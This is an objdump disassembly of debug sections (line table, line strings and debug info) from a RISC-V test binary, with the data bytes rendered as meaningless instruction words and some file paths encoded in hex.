     dec:	0501                	.insn	2, 0x0501
     dee:	0311                	.insn	2, 0x0311
     df0:	0900                	.insn	2, 0x0900
     df2:	0008                	.insn	2, 0x0008
     df4:	0501                	.insn	2, 0x0501
     df6:	0305                	.insn	2, 0x0305
     df8:	0901                	.insn	2, 0x0901
     dfa:	0008                	.insn	2, 0x0008
     dfc:	0501                	.insn	2, 0x0501
     dfe:	0311                	.insn	2, 0x0311
     e00:	0900                	.insn	2, 0x0900
     e02:	0008                	.insn	2, 0x0008
     e04:	0501                	.insn	2, 0x0501
     e06:	0305                	.insn	2, 0x0305
     e08:	0901                	.insn	2, 0x0901
     e0a:	0008                	.insn	2, 0x0008
     e0c:	0501                	.insn	2, 0x0501
     e0e:	0311                	.insn	2, 0x0311
     e10:	0900                	.insn	2, 0x0900
     e12:	0008                	.insn	2, 0x0008
     e14:	0501                	.insn	2, 0x0501
     e16:	0305                	.insn	2, 0x0305
     e18:	0901                	.insn	2, 0x0901
     e1a:	0008                	.insn	2, 0x0008
     e1c:	0501                	.insn	2, 0x0501
     e1e:	0311                	.insn	2, 0x0311
     e20:	0900                	.insn	2, 0x0900
     e22:	0008                	.insn	2, 0x0008
     e24:	0501                	.insn	2, 0x0501
     e26:	0305                	.insn	2, 0x0305
     e28:	0901                	.insn	2, 0x0901
     e2a:	0008                	.insn	2, 0x0008
     e2c:	0501                	.insn	2, 0x0501
     e2e:	0311                	.insn	2, 0x0311
     e30:	0900                	.insn	2, 0x0900
     e32:	0008                	.insn	2, 0x0008
     e34:	0501                	.insn	2, 0x0501
     e36:	0305                	.insn	2, 0x0305
     e38:	0901                	.insn	2, 0x0901
     e3a:	0008                	.insn	2, 0x0008
     e3c:	0501                	.insn	2, 0x0501
     e3e:	0311                	.insn	2, 0x0311
     e40:	0900                	.insn	2, 0x0900
     e42:	0008                	.insn	2, 0x0008
     e44:	0501                	.insn	2, 0x0501
     e46:	0305                	.insn	2, 0x0305
     e48:	0901                	.insn	2, 0x0901
     e4a:	0008                	.insn	2, 0x0008
     e4c:	0501                	.insn	2, 0x0501
     e4e:	0311                	.insn	2, 0x0311
     e50:	0900                	.insn	2, 0x0900
     e52:	0008                	.insn	2, 0x0008
     e54:	0501                	.insn	2, 0x0501
     e56:	0305                	.insn	2, 0x0305
     e58:	0901                	.insn	2, 0x0901
     e5a:	0008                	.insn	2, 0x0008
     e5c:	0501                	.insn	2, 0x0501
     e5e:	0311                	.insn	2, 0x0311
     e60:	0900                	.insn	2, 0x0900
     e62:	0008                	.insn	2, 0x0008
     e64:	0501                	.insn	2, 0x0501
     e66:	0305                	.insn	2, 0x0305
     e68:	0901                	.insn	2, 0x0901
     e6a:	0008                	.insn	2, 0x0008
     e6c:	0501                	.insn	2, 0x0501
     e6e:	0311                	.insn	2, 0x0311
     e70:	0900                	.insn	2, 0x0900
     e72:	0008                	.insn	2, 0x0008
     e74:	0501                	.insn	2, 0x0501
     e76:	0305                	.insn	2, 0x0305
     e78:	0901                	.insn	2, 0x0901
     e7a:	0008                	.insn	2, 0x0008
     e7c:	0501                	.insn	2, 0x0501
     e7e:	0311                	.insn	2, 0x0311
     e80:	0900                	.insn	2, 0x0900
     e82:	0008                	.insn	2, 0x0008
     e84:	0501                	.insn	2, 0x0501
     e86:	0305                	.insn	2, 0x0305
     e88:	0901                	.insn	2, 0x0901
     e8a:	0008                	.insn	2, 0x0008
     e8c:	0501                	.insn	2, 0x0501
     e8e:	0311                	.insn	2, 0x0311
     e90:	0900                	.insn	2, 0x0900
     e92:	0008                	.insn	2, 0x0008
     e94:	0501                	.insn	2, 0x0501
     e96:	0902030f          	.insn	4, 0x0902030f
     e9a:	0008                	.insn	2, 0x0008
     e9c:	0501                	.insn	2, 0x0501
     e9e:	0302                	.insn	2, 0x0302
     ea0:	0900                	.insn	2, 0x0900
     ea2:	0004                	.insn	2, 0x0004
     ea4:	0501                	.insn	2, 0x0501
     ea6:	0310                	.insn	2, 0x0310
     ea8:	00040903          	lb	s2,0(s0)
     eac:	0501                	.insn	2, 0x0501
     eae:	09000303          	lb	t1,144(zero) # 90 <_start-0xf70>
     eb2:	0004                	.insn	2, 0x0004
     eb4:	0501                	.insn	2, 0x0501
     eb6:	0312                	.insn	2, 0x0312
     eb8:	0901                	.insn	2, 0x0901
     eba:	0004                	.insn	2, 0x0004
     ebc:	0501                	.insn	2, 0x0501
     ebe:	0038                	.insn	2, 0x0038
     ec0:	0402                	.insn	2, 0x0402
     ec2:	097f0303          	lb	t1,151(t5)
     ec6:	0018                	.insn	2, 0x0018
     ec8:	0501                	.insn	2, 0x0501
     eca:	001f 0402 0301      	.insn	6, 0x03010402001f
     ed0:	0900                	.insn	2, 0x0900
     ed2:	000c                	.insn	2, 0x000c
     ed4:	0501                	.insn	2, 0x0501
     ed6:	0310                	.insn	2, 0x0310
     ed8:	0905                	.insn	2, 0x0905
     eda:	000c                	.insn	2, 0x000c
     edc:	0501                	.insn	2, 0x0501
     ede:	09000303          	lb	t1,144(zero) # 90 <_start-0xf70>
     ee2:	0004                	.insn	2, 0x0004
     ee4:	0501                	.insn	2, 0x0501
     ee6:	0304                	.insn	2, 0x0304
     ee8:	00040903          	lb	s2,0(s0)
     eec:	0301                	.insn	2, 0x0301
     eee:	0902                	.insn	2, 0x0902
     ef0:	0018                	.insn	2, 0x0018
     ef2:	0501                	.insn	2, 0x0501
     ef4:	030e                	.insn	2, 0x030e
     ef6:	0901                	.insn	2, 0x0901
     ef8:	0008                	.insn	2, 0x0008
     efa:	0501                	.insn	2, 0x0501
     efc:	0304                	.insn	2, 0x0304
     efe:	0900                	.insn	2, 0x0900
     f00:	0018                	.insn	2, 0x0018
     f02:	0301                	.insn	2, 0x0301
     f04:	00080917          	auipc	s2,0x80
     f08:	0501                	.insn	2, 0x0501
     f0a:	0040                	.insn	2, 0x0040
     f0c:	0402                	.insn	2, 0x0402
     f0e:	09630303          	lb	t1,150(t1) # 9010e1c <__rodata_end+0x900e316>
     f12:	0014                	.insn	2, 0x0014
     f14:	0501                	.insn	2, 0x0501
     f16:	04020027          	.insn	4, 0x04020027
     f1a:	0301                	.insn	2, 0x0301
     f1c:	0900                	.insn	2, 0x0900
     f1e:	000c                	.insn	2, 0x000c
     f20:	0501                	.insn	2, 0x0501
     f22:	09210303          	lb	t1,146(sp)
     f26:	000c                	.insn	2, 0x000c
     f28:	0501                	.insn	2, 0x0501
     f2a:	0900030f          	.insn	4, 0x0900030f
     f2e:	0008                	.insn	2, 0x0008
     f30:	0501                	.insn	2, 0x0501
     f32:	0306                	.insn	2, 0x0306
     f34:	0901                	.insn	2, 0x0901
     f36:	0008                	.insn	2, 0x0008
     f38:	0501                	.insn	2, 0x0501
     f3a:	0312                	.insn	2, 0x0312
     f3c:	0900                	.insn	2, 0x0900
     f3e:	0008                	.insn	2, 0x0008
     f40:	0501                	.insn	2, 0x0501
     f42:	0306                	.insn	2, 0x0306
     f44:	0901                	.insn	2, 0x0901
     f46:	0008                	.insn	2, 0x0008
     f48:	0501                	.insn	2, 0x0501
     f4a:	0312                	.insn	2, 0x0312
     f4c:	0900                	.insn	2, 0x0900
     f4e:	0008                	.insn	2, 0x0008
     f50:	0501                	.insn	2, 0x0501
     f52:	0306                	.insn	2, 0x0306
     f54:	0901                	.insn	2, 0x0901
     f56:	0008                	.insn	2, 0x0008
     f58:	0501                	.insn	2, 0x0501
     f5a:	0312                	.insn	2, 0x0312
     f5c:	0900                	.insn	2, 0x0900
     f5e:	0008                	.insn	2, 0x0008
     f60:	0501                	.insn	2, 0x0501
     f62:	0306                	.insn	2, 0x0306
     f64:	0901                	.insn	2, 0x0901
     f66:	0008                	.insn	2, 0x0008
     f68:	0501                	.insn	2, 0x0501
     f6a:	0312                	.insn	2, 0x0312
     f6c:	0900                	.insn	2, 0x0900
     f6e:	0008                	.insn	2, 0x0008
     f70:	0501                	.insn	2, 0x0501
     f72:	0306                	.insn	2, 0x0306
     f74:	0901                	.insn	2, 0x0901
     f76:	0008                	.insn	2, 0x0008
     f78:	0501                	.insn	2, 0x0501
     f7a:	0312                	.insn	2, 0x0312
     f7c:	0900                	.insn	2, 0x0900
     f7e:	0008                	.insn	2, 0x0008
     f80:	0501                	.insn	2, 0x0501
     f82:	0306                	.insn	2, 0x0306
     f84:	0901                	.insn	2, 0x0901
     f86:	0008                	.insn	2, 0x0008
     f88:	0501                	.insn	2, 0x0501
     f8a:	0312                	.insn	2, 0x0312
     f8c:	0900                	.insn	2, 0x0900
     f8e:	0008                	.insn	2, 0x0008
     f90:	0501                	.insn	2, 0x0501
     f92:	09010303          	lb	t1,144(sp)
     f96:	0008                	.insn	2, 0x0008
     f98:	0501                	.insn	2, 0x0501
     f9a:	031d                	.insn	2, 0x031d
     f9c:	0900                	.insn	2, 0x0900
     f9e:	0008                	.insn	2, 0x0008
     fa0:	0501                	.insn	2, 0x0501
     fa2:	0900030f          	.insn	4, 0x0900030f
     fa6:	0008                	.insn	2, 0x0008
     fa8:	0501                	.insn	2, 0x0501
     faa:	0309                	.insn	2, 0x0309
     fac:	0901                	.insn	2, 0x0901
     fae:	0004                	.insn	2, 0x0004
     fb0:	0501                	.insn	2, 0x0501
     fb2:	0315                	.insn	2, 0x0315
     fb4:	0900                	.insn	2, 0x0900
     fb6:	0008                	.insn	2, 0x0008
     fb8:	0501                	.insn	2, 0x0501
     fba:	0309                	.insn	2, 0x0309
     fbc:	0901                	.insn	2, 0x0901
     fbe:	0008                	.insn	2, 0x0008
     fc0:	0501                	.insn	2, 0x0501
     fc2:	0315                	.insn	2, 0x0315
     fc4:	0900                	.insn	2, 0x0900
     fc6:	0008                	.insn	2, 0x0008
     fc8:	0501                	.insn	2, 0x0501
     fca:	0309                	.insn	2, 0x0309
     fcc:	0901                	.insn	2, 0x0901
     fce:	0008                	.insn	2, 0x0008
     fd0:	0501                	.insn	2, 0x0501
     fd2:	0315                	.insn	2, 0x0315
     fd4:	0900                	.insn	2, 0x0900
     fd6:	0008                	.insn	2, 0x0008
     fd8:	0501                	.insn	2, 0x0501
     fda:	0309                	.insn	2, 0x0309
     fdc:	0901                	.insn	2, 0x0901
     fde:	0008                	.insn	2, 0x0008
     fe0:	0501                	.insn	2, 0x0501
     fe2:	0315                	.insn	2, 0x0315
     fe4:	0900                	.insn	2, 0x0900
     fe6:	0008                	.insn	2, 0x0008
     fe8:	0501                	.insn	2, 0x0501
     fea:	0309                	.insn	2, 0x0309
     fec:	0901                	.insn	2, 0x0901
     fee:	0008                	.insn	2, 0x0008
     ff0:	0501                	.insn	2, 0x0501
     ff2:	0315                	.insn	2, 0x0315
     ff4:	0900                	.insn	2, 0x0900
     ff6:	0008                	.insn	2, 0x0008
     ff8:	0501                	.insn	2, 0x0501
     ffa:	0309                	.insn	2, 0x0309
     ffc:	0901                	.insn	2, 0x0901
     ffe:	0008                	.insn	2, 0x0008
    1000:	0501                	.insn	2, 0x0501
    1002:	0315                	.insn	2, 0x0315
    1004:	0900                	.insn	2, 0x0900
    1006:	0008                	.insn	2, 0x0008
    1008:	0501                	.insn	2, 0x0501
    100a:	031f 0901 0008      	.insn	6, 0x00080901031f
    1010:	0501                	.insn	2, 0x0501
    1012:	0311                	.insn	2, 0x0311
    1014:	0900                	.insn	2, 0x0900
    1016:	000c                	.insn	2, 0x000c
    1018:	0501                	.insn	2, 0x0501
    101a:	09000303          	lb	t1,144(zero) # 90 <_start-0xf70>
    101e:	0004                	.insn	2, 0x0004
    1020:	0501                	.insn	2, 0x0501
    1022:	09000323          	sb	a6,134(zero) # 86 <_start-0xf7a>
    1026:	0008                	.insn	2, 0x0008
    1028:	0501                	.insn	2, 0x0501
    102a:	0900030f          	.insn	4, 0x0900030f
    102e:	0008                	.insn	2, 0x0008
    1030:	0501                	.insn	2, 0x0501
    1032:	0309                	.insn	2, 0x0309
    1034:	0901                	.insn	2, 0x0901
    1036:	0004                	.insn	2, 0x0004
    1038:	0501                	.insn	2, 0x0501
    103a:	0315                	.insn	2, 0x0315
    103c:	0900                	.insn	2, 0x0900
    103e:	0008                	.insn	2, 0x0008
    1040:	0501                	.insn	2, 0x0501
    1042:	030c                	.insn	2, 0x030c
    1044:	0902                	.insn	2, 0x0902
    1046:	0008                	.insn	2, 0x0008
    1048:	0501                	.insn	2, 0x0501
    104a:	0030                	.insn	2, 0x0030
    104c:	0402                	.insn	2, 0x0402
    104e:	0302                	.insn	2, 0x0302
    1050:	0946                	.insn	2, 0x0946
    1052:	000c                	.insn	2, 0x000c
    1054:	0501                	.insn	2, 0x0501
    1056:	001c                	.insn	2, 0x001c
    1058:	0402                	.insn	2, 0x0402
    105a:	0301                	.insn	2, 0x0301
    105c:	0900                	.insn	2, 0x0900
    105e:	000c                	.insn	2, 0x000c
    1060:	0501                	.insn	2, 0x0501
    1062:	0305                	.insn	2, 0x0305
    1064:	093e                	.insn	2, 0x093e
    1066:	000c                	.insn	2, 0x000c
    1068:	0501                	.insn	2, 0x0501
    106a:	0311                	.insn	2, 0x0311
    106c:	0900                	.insn	2, 0x0900
    106e:	0008                	.insn	2, 0x0008
    1070:	0501                	.insn	2, 0x0501
    1072:	0305                	.insn	2, 0x0305
    1074:	0901                	.insn	2, 0x0901
    1076:	0008                	.insn	2, 0x0008
    1078:	0501                	.insn	2, 0x0501
    107a:	0311                	.insn	2, 0x0311
    107c:	0900                	.insn	2, 0x0900
    107e:	0008                	.insn	2, 0x0008
    1080:	0501                	.insn	2, 0x0501
    1082:	0305                	.insn	2, 0x0305
    1084:	0901                	.insn	2, 0x0901
    1086:	0008                	.insn	2, 0x0008
    1088:	0501                	.insn	2, 0x0501
    108a:	0311                	.insn	2, 0x0311
    108c:	0900                	.insn	2, 0x0900
    108e:	0008                	.insn	2, 0x0008
    1090:	0501                	.insn	2, 0x0501
    1092:	0305                	.insn	2, 0x0305
    1094:	0901                	.insn	2, 0x0901
    1096:	0008                	.insn	2, 0x0008
    1098:	0501                	.insn	2, 0x0501
    109a:	0311                	.insn	2, 0x0311
    109c:	0900                	.insn	2, 0x0900
    109e:	0008                	.insn	2, 0x0008
    10a0:	0501                	.insn	2, 0x0501
    10a2:	0305                	.insn	2, 0x0305
    10a4:	0901                	.insn	2, 0x0901
    10a6:	0008                	.insn	2, 0x0008
    10a8:	0501                	.insn	2, 0x0501
    10aa:	0311                	.insn	2, 0x0311
    10ac:	0900                	.insn	2, 0x0900
    10ae:	0008                	.insn	2, 0x0008
    10b0:	0501                	.insn	2, 0x0501
    10b2:	0305                	.insn	2, 0x0305
    10b4:	0901                	.insn	2, 0x0901
    10b6:	0008                	.insn	2, 0x0008
    10b8:	0501                	.insn	2, 0x0501
    10ba:	0311                	.insn	2, 0x0311
    10bc:	0900                	.insn	2, 0x0900
    10be:	0008                	.insn	2, 0x0008
    10c0:	0501                	.insn	2, 0x0501
    10c2:	0305                	.insn	2, 0x0305
    10c4:	0901                	.insn	2, 0x0901
    10c6:	0008                	.insn	2, 0x0008
    10c8:	0501                	.insn	2, 0x0501
    10ca:	0311                	.insn	2, 0x0311
    10cc:	0900                	.insn	2, 0x0900
    10ce:	0008                	.insn	2, 0x0008
    10d0:	0501                	.insn	2, 0x0501
    10d2:	0305                	.insn	2, 0x0305
    10d4:	0901                	.insn	2, 0x0901
    10d6:	0008                	.insn	2, 0x0008
    10d8:	0501                	.insn	2, 0x0501
    10da:	0311                	.insn	2, 0x0311
    10dc:	0900                	.insn	2, 0x0900
    10de:	0008                	.insn	2, 0x0008
    10e0:	0501                	.insn	2, 0x0501
    10e2:	0305                	.insn	2, 0x0305
    10e4:	0901                	.insn	2, 0x0901
    10e6:	0008                	.insn	2, 0x0008
    10e8:	0501                	.insn	2, 0x0501
    10ea:	0311                	.insn	2, 0x0311
    10ec:	0900                	.insn	2, 0x0900
    10ee:	0008                	.insn	2, 0x0008
    10f0:	0501                	.insn	2, 0x0501
    10f2:	0305                	.insn	2, 0x0305
    10f4:	0901                	.insn	2, 0x0901
    10f6:	0008                	.insn	2, 0x0008
    10f8:	0501                	.insn	2, 0x0501
    10fa:	0311                	.insn	2, 0x0311
    10fc:	0900                	.insn	2, 0x0900
    10fe:	0008                	.insn	2, 0x0008
    1100:	0501                	.insn	2, 0x0501
    1102:	0301                	.insn	2, 0x0301
    1104:	0902                	.insn	2, 0x0902
    1106:	0008                	.insn	2, 0x0008
    1108:	0901                	.insn	2, 0x0901
    110a:	0014                	.insn	2, 0x0014
    110c:	0100                	.insn	2, 0x0100
    110e:	Address 0x110e is out of bounds.


Disassembly of section .debug_line_str:

00000000 <.debug_line_str>:
   0:	6473722f          	.insn	4, 0x6473722f
   4:	6d2d                	.insn	2, 0x6d2d
   6:	502f646f          	jal	s0,f6508 <__rodata_end+0xf3a02>
   a:	6f72                	.insn	2, 0x6f72
   c:	73736563          	bltu	t1,s7,736 <_start-0x8ca>
  10:	532f726f          	jal	tp,f7542 <__rodata_end+0xf4a3c>
  14:	6372                	.insn	2, 0x6372
  16:	7265562f          	.insn	4, 0x7265562f
  1a:	6669                	.insn	2, 0x6669
  1c:	6369                	.insn	2, 0x6369
  1e:	7461                	.insn	2, 0x7461
  20:	6f69                	.insn	2, 0x6f69
  22:	2f6e                	.insn	2, 0x2f6e
  24:	6554                	.insn	2, 0x6554
  26:	6f437473          	csrrci	s0,0x6f4,6
  2a:	6564                	.insn	2, 0x6564
  2c:	722f432f          	.insn	4, 0x722f432f
  30:	612d6473          	csrrsi	s0,0x612,26
  34:	7474                	.insn	2, 0x7474
  36:	6361                	.insn	2, 0x6361
  38:	7200736b          	.insn	4, 0x7200736b
  3c:	632d6473          	csrrsi	s0,0x632,26
  40:	7472                	.insn	2, 0x7472
  42:	732e                	.insn	2, 0x732e
  44:	2f00                	.insn	2, 0x2f00
  46:	7372                	.insn	2, 0x7372
  48:	2d64                	.insn	2, 0x2d64
  4a:	6f6d                	.insn	2, 0x6f6d
  4c:	2f64                	.insn	2, 0x2f64
  4e:	7250                	.insn	2, 0x7250
  50:	7365636f          	jal	t1,56786 <__rodata_end+0x53c80>
  54:	2f726f73          	csrrsi	t5,0x2f7,4
  58:	2f637253          	.insn	4, 0x2f637253
  5c:	6556                	.insn	2, 0x6556
  5e:	6972                	.insn	2, 0x6972
  60:	6966                	.insn	2, 0x6966
  62:	69746163          	bltu	s0,s7,6e4 <_start-0x91c>
  66:	542f6e6f          	jal	t3,f65a8 <__rodata_end+0xf3aa2>
  6a:	7365                	.insn	2, 0x7365
  6c:	4374                	.insn	2, 0x4374
  6e:	2f65646f          	jal	s0,56364 <__rodata_end+0x5385e>
  72:	7372                	.insn	2, 0x7372
  74:	2d64                	.insn	2, 0x2d64
  76:	6f6c                	.insn	2, 0x6f6c
  78:	6461                	.insn	2, 0x6461
  7a:	7265                	.insn	2, 0x7265
  7c:	632e                	.insn	2, 0x632e
  7e:	2f00                	.insn	2, 0x2f00
  80:	7372                	.insn	2, 0x7372
  82:	2d64                	.insn	2, 0x2d64
  84:	6f6d                	.insn	2, 0x6f6d
  86:	2f64                	.insn	2, 0x2f64
  88:	7250                	.insn	2, 0x7250
  8a:	7365636f          	jal	t1,567c0 <__rodata_end+0x53cba>
  8e:	2f726f73          	csrrsi	t5,0x2f7,4
  92:	2f637253          	.insn	4, 0x2f637253
  96:	6556                	.insn	2, 0x6556
  98:	6972                	.insn	2, 0x6972
  9a:	6966                	.insn	2, 0x6966
  9c:	69746163          	bltu	s0,s7,71e <_start-0x8e2>
  a0:	542f6e6f          	jal	t3,f65e2 <__rodata_end+0xf3adc>
  a4:	7365                	.insn	2, 0x7365
  a6:	4374                	.insn	2, 0x4374
  a8:	0065646f          	jal	s0,560ae <__rodata_end+0x535a8>
  ac:	74706f2f          	.insn	4, 0x74706f2f
  b0:	7369722f          	.insn	4, 0x7369722f
  b4:	6c2f7663          	bgeu	t5,sp,780 <_start-0x880>
  b8:	6269                	.insn	2, 0x6269
  ba:	6363672f          	.insn	4, 0x6363672f
  be:	7369722f          	.insn	4, 0x7369722f
  c2:	32337663          	bgeu	t1,gp,3ee <_start-0xc12>
  c6:	752d                	.insn	2, 0x752d
  c8:	6b6e                	.insn	2, 0x6b6e
  ca:	6f6e                	.insn	2, 0x6f6e
  cc:	652d6e77          	.insn	4, 0x652d6e77
  d0:	666c                	.insn	2, 0x666c
  d2:	2e33312f          	.insn	4, 0x2e33312f
  d6:	2e32                	.insn	2, 0x2e32
  d8:	2f30                	.insn	2, 0x2f30
  da:	6e69                	.insn	2, 0x6e69
  dc:	64756c63          	bltu	a0,t2,734 <_start-0x8cc>
  e0:	0065                	.insn	2, 0x0065
  e2:	69647473          	csrrci	s0,0x696,8
  e6:	746e                	.insn	2, 0x746e
  e8:	672d                	.insn	2, 0x672d
  ea:	682e6363          	bltu	t3,sp,770 <_start-0x890>
  ee:	7300                	.insn	2, 0x7300
  f0:	6474                	.insn	2, 0x6474
  f2:	6564                	.insn	2, 0x6564
  f4:	2e66                	.insn	2, 0x2e66
  f6:	0068                	.insn	2, 0x0068
  f8:	65646f63          	bltu	s0,s6,756 <_start-0x8aa>
  fc:	632e                	.insn	2, 0x632e
  fe:	2e00                	.insn	2, 0x2e00
 100:	002e                	.insn	2, 0x002e
 102:	6e69                	.insn	2, 0x6e69
 104:	6f2f0063          	beq	t5,s2,7e4 <_start-0x81c>
 108:	7470                	.insn	2, 0x7470
 10a:	7369722f          	.insn	4, 0x7369722f
 10e:	722f7663          	bgeu	t5,sp,83a <_start-0x7c6>
 112:	7369                	.insn	2, 0x7369
 114:	32337663          	bgeu	t1,gp,440 <_start-0xbc0>
 118:	752d                	.insn	2, 0x752d
 11a:	6b6e                	.insn	2, 0x6b6e
 11c:	6f6e                	.insn	2, 0x6f6e
 11e:	652d6e77          	.insn	4, 0x652d6e77
 122:	666c                	.insn	2, 0x666c
 124:	636e692f          	.insn	4, 0x636e692f
 128:	756c                	.insn	2, 0x756c
 12a:	6564                	.insn	2, 0x6564
 12c:	63616d2f          	.insn	4, 0x63616d2f
 130:	6968                	.insn	2, 0x6968
 132:	656e                	.insn	2, 0x656e
 134:	2f00                	.insn	2, 0x2f00
 136:	2f74706f          	j	47c2c <__rodata_end+0x45126>
 13a:	6972                	.insn	2, 0x6972
 13c:	2f766373          	csrrsi	t1,0x2f7,12
 140:	6972                	.insn	2, 0x6972
 142:	33766373          	csrrsi	t1,mhpmevent23,12
 146:	2d32                	.insn	2, 0x2d32
 148:	6e75                	.insn	2, 0x6e75
 14a:	776f6e6b          	.insn	4, 0x776f6e6b
 14e:	2d6e                	.insn	2, 0x2d6e
 150:	6c65                	.insn	2, 0x6c65
 152:	2f66                	.insn	2, 0x2f66
 154:	6e69                	.insn	2, 0x6e69
 156:	64756c63          	bltu	a0,t2,7ae <_start-0x852>
 15a:	2f65                	.insn	2, 0x2f65
 15c:	00737973          	csrrci	s2,0x7,6
 160:	696c                	.insn	2, 0x696c
 162:	2e62                	.insn	2, 0x2e62
 164:	61630063          	beq	t1,s6,764 <_start-0x89c>
 168:	2e656863          	bltu	a0,t1,458 <_start-0xba8>
 16c:	0068                	.insn	2, 0x0068
 16e:	67646167          	.insn	4, 0x67646167
 172:	7465                	.insn	2, 0x7465
 174:	682e                	.insn	2, 0x682e
 176:	5f00                	.insn	2, 0x5f00
 178:	6564                	.insn	2, 0x6564
 17a:	6166                	.insn	2, 0x6166
 17c:	6c75                	.insn	2, 0x6c75
 17e:	5f74                	.insn	2, 0x5f74
 180:	7974                	.insn	2, 0x7974
 182:	6570                	.insn	2, 0x6570
 184:	00682e73          	csrrs	t3,0x6,a6
 188:	735f 6474 6e69      	.insn	6, 0x6e696474735f
 18e:	2e74                	.insn	2, 0x2e74
 190:	0068                	.insn	2, 0x0068

Disassembly of section .debug_info:

00000000 <.debug_info>:
   0:	0021                	.insn	2, 0x0021
   2:	0000                	.insn	2, 0x
   4:	0005                	.insn	2, 0x0005
   6:	0401                	.insn	2, 0x0401
   8:	0000                	.insn	2, 0x
   a:	0000                	.insn	2, 0x
   c:	0001                	.insn	2, 0x0001
   e:	0000                	.insn	2, 0x
  10:	0000                	.insn	2, 0x
  12:	0010                	.insn	2, 0x0010
  14:	cc00                	.insn	2, 0xcc00
  16:	00000013          	nop
  1a:	0a00                	.insn	2, 0x0a00
  1c:	0000                	.insn	2, 0x
  1e:	4500                	.insn	2, 0x4500
  20:	0000                	.insn	2, 0x
  22:	0100                	.insn	2, 0x0100
  24:	da80                	.insn	2, 0xda80
  26:	0001                	.insn	2, 0x0001
  28:	0500                	.insn	2, 0x0500
  2a:	0100                	.insn	2, 0x0100
  2c:	1404                	.insn	2, 0x1404
  2e:	0000                	.insn	2, 0x
  30:	0b00                	.insn	2, 0x0b00
  32:	0129                	.insn	2, 0x0129
  34:	0000                	.insn	2, 0x
  36:	451d                	.insn	2, 0x451d
  38:	0000                	.insn	2, 0x
  3a:	0000                	.insn	2, 0x
  3c:	0000                	.insn	2, 0x
  3e:	bc00                	.insn	2, 0xbc00
  40:	0019                	.insn	2, 0x0019
  42:	6400                	.insn	2, 0x6400
  44:	0001                	.insn	2, 0x0001
  46:	5800                	.insn	2, 0x5800
  48:	01000003          	lb	zero,16(zero) # 10 <_start-0xff0>
  4c:	0601                	.insn	2, 0x0601
  4e:	0081                	.insn	2, 0x0081
  50:	0000                	.insn	2, 0x
  52:	0201                	.insn	2, 0x0201
  54:	0d05                	.insn	2, 0x0d05
  56:	0001                	.insn	2, 0x0001
  58:	0100                	.insn	2, 0x0100
  5a:	0504                	.insn	2, 0x0504
  5c:	00f8                	.insn	2, 0x00f8
  5e:	0000                	.insn	2, 0x
  60:	0801                	.insn	2, 0x0801
  62:	f305                	.insn	2, 0xf305
  64:	0000                	.insn	2, 0x
  66:	0800                	.insn	2, 0x0800
  68:	000001f7          	.insn	4, 0x01f7
  6c:	2e02                	.insn	2, 0x2e02
  6e:	5318                	.insn	2, 0x5318
  70:	0000                	.insn	2, 0x
  72:	0c00                	.insn	2, 0x0c00
  74:	0042                	.insn	2, 0x0042
  76:	0000                	.insn	2, 0x
  78:	0101                	.insn	2, 0x0101
  7a:	7f08                	.insn	2, 0x7f08
  7c:	0000                	.insn	2, 0x
  7e:	0100                	.insn	2, 0x0100
  80:	0702                	.insn	2, 0x0702
  82:	008d                	.insn	2, 0x008d
  84:	0000                	.insn	2, 0x
  86:	0401                	.insn	2, 0x0401
  88:	0000d707          	.insn	4, 0xd707
  8c:	0100                	.insn	2, 0x0100
  8e:	0708                	.insn	2, 0x0708
  90:	00d2                	.insn	2, 0x00d2
  92:	0000                	.insn	2, 0x
  94:	040d                	.insn	2, 0x040d
  96:	6905                	.insn	2, 0x6905
  98:	746e                	.insn	2, 0x746e
  9a:	0100                	.insn	2, 0x0100
  9c:	0704                	.insn	2, 0x0704
  9e:	00dc                	.insn	2, 0x00dc
  a0:	0000                	.insn	2, 0x
  a2:	5108                	.insn	2, 0x5108
  a4:	0000                	.insn	2, 0x
  a6:	0300                	.insn	2, 0x0300
  a8:	17d6                	.insn	2, 0x17d6
  aa:	0076                	.insn	2, 0x0076
  ac:	0000                	.insn	2, 0x
  ae:	1001                	.insn	2, 0x1001
  b0:	e004                	.insn	2, 0xe004
  b2:	0001                	.insn	2, 0x0001
  b4:	0200                	.insn	2, 0x0200
  b6:	00000063          	beqz	zero,b6 <_start-0xf4a>
  ba:	6f04                	.insn	2, 0x6f04
  bc:	0000                	.insn	2, 0x
  be:	0200                	.insn	2, 0x0200
  c0:	00000117          	auipc	sp,0x0
  c4:	6f05                	.insn	2, 0x6f05
  c6:	0000                	.insn	2, 0x
  c8:	0200                	.insn	2, 0x0200
  ca:	0058                	.insn	2, 0x0058
  cc:	0000                	.insn	2, 0x
  ce:	6f06                	.insn	2, 0x6f06
  d0:	0000                	.insn	2, 0x
  d2:	0200                	.insn	2, 0x0200
  d4:	00c6                	.insn	2, 0x00c6
  d6:	0000                	.insn	2, 0x
  d8:	00006f07          	.insn	4, 0x6f07
  dc:	0200                	.insn	2, 0x0200
  de:	00e9                	.insn	2, 0x00e9
  e0:	0000                	.insn	2, 0x
  e2:	6f08                	.insn	2, 0x6f08
  e4:	0000                	.insn	2, 0x
  e6:	0e00                	.insn	2, 0x0e00
  e8:	00a0                	.insn	2, 0x00a0
  ea:	0000                	.insn	2, 0x
  ec:	1e01                	.insn	2, 0x1e01
  ee:	a406                	.insn	2, 0xa406
  f0:	001a                	.insn	2, 0x001a
  f2:	7c00                	.insn	2, 0x7c00
  f4:	0000                	.insn	2, 0x
  f6:	0100                	.insn	2, 0x0100
  f8:	f59c                	.insn	2, 0xf59c
  fa:	0000                	.insn	2, 0x
  fc:	0400                	.insn	2, 0x0400
  fe:	0070                	.insn	2, 0x0070
 100:	0000                	.insn	2, 0x
 102:	0c22                	.insn	2, 0x0c22
 104:	007d                	.insn	2, 0x007d
 106:	0000                	.insn	2, 0x
 108:	9102                	.insn	2, 0x9102
 10a:	046c                	.insn	2, 0x046c
 10c:	000000b7          	lui	ra,0x0
 110:	007d0c23          	sb	t2,24(s10)
 114:	0000                	.insn	2, 0x
 116:	9102                	.insn	2, 0x9102
 118:	0068                	.insn	2, 0x0068
 11a:	a609                	.insn	2, 0xa609
 11c:	0000                	.insn	2, 0x
 11e:	1600                	.insn	2, 0x1600
 120:	0158                	.insn	2, 0x0158
 122:	0000                	.insn	2, 0x
 124:	1a38                	.insn	2, 0x1a38
 126:	0000                	.insn	2, 0x
 128:	006c                	.insn	2, 0x006c
 12a:	0000                	.insn	2, 0x
 12c:	9c01                	.insn	2, 0x9c01
 12e:	0158                	.insn	2, 0x0158
 130:	0000                	.insn	2, 0x
 132:	2405                	.insn	2, 0x2405
 134:	0001                	.insn	2, 0x0001
 136:	1600                	.insn	2, 0x1600
